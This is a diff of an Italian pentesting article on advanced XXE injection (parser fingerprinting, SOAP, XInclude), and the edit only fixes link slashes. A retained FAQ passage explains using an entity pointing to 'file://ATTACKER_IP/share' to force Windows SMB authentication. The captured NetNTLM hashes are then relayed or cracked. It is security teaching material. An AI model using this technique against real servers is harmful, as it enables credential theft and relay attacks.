@@ -22,7 +22,7 @@ tags:
 
 # XXE Injection: Parser Specifici, Fingerprinting e Tecniche Avanzate
 
-La guida [xxe](https://hackita.it/articoli/xxe) copre i concetti base e i payload principali. Questo articolo va più in profondità: come identificare quale parser XML sta usando l'applicazione, come ogni parser si comporta diversamente, e le tecniche di injection che funzionano solo in contesti specifici — SOAP, XInclude, content-type switching. Copre anche l'enumerazione WSDL come ricognizione preliminare, non come tecnica di exploitation a sé.
+La guida [xxe](https://hackita.it/articoli/xxe/) copre i concetti base e i payload principali. Questo articolo va più in profondità: come identificare quale parser XML sta usando l'applicazione, come ogni parser si comporta diversamente, e le tecniche di injection che funzionano solo in contesti specifici — SOAP, XInclude, content-type switching. Copre anche l'enumerazione WSDL come ricognizione preliminare, non come tecnica di exploitation a sé.
 
 Capire il parser è fondamentale perché **non tutti i parser sono vulnerabili allo stesso modo**, e il comportamento cambia non solo da linguaggio a linguaggio ma da versione a versione, da flag a flag. Sapere su cosa stai testando ti evita di sprecare tempo su payload che non possono funzionare — ma nessun indicatore da solo ti dà la certezza: lo vedrai nella sezione fingerprinting.
 
@@ -653,7 +653,7 @@ No. Richiede che il parser abbia XInclude abilitato e che lo processi attivament
 Sì. PHP 8.0+ disabilita le external entity di default tramite libxml2 — ma se il codice passa esplicitamente `LIBXML_NOENT` a `loadXML()` o `simplexml_load_string()`, riabilita l'espansione delle entità, incluse quelle esterne. PHP 8.4 introduce `LIBXML_NO_XXE` per disabilitarle in modo esplicito, quando supportato dalla libxml2 di sistema — ma resta un'opzione da attivare, non un default garantito su tutte le versioni.
 
 **Come sfrutto un UNC path via XXE su Windows?**
-Un'entità che punta a `file://ATTACKER_IP/share` può far tentare al server Windows un'autenticazione SMB verso il tuo host per accedere al path. Con Responder in ascolto puoi catturare la risposta NetNTLM (non una password in chiaro, ma un hash da usare in attacchi successivi tipo relay con [ntlmrelayx](https://hackita.it/articoli/ntlmrelayx) o cracking offline). Nota: molti ambienti bloccano l'autenticazione SMB in uscita a livello di rete o firewall, quindi non è garantito che il traffico esca davvero.
+Un'entità che punta a `file://ATTACKER_IP/share` può far tentare al server Windows un'autenticazione SMB verso il tuo host per accedere al path. Con Responder in ascolto puoi catturare la risposta NetNTLM (non una password in chiaro, ma un hash da usare in attacchi successivi tipo relay con [ntlmrelayx](https://hackita.it/articoli/ntlmrelayx/) o cracking offline). Nota: molti ambienti bloccano l'autenticazione SMB in uscita a livello di rete o firewall, quindi non è garantito che il traffico esca davvero.
 
 ***
 
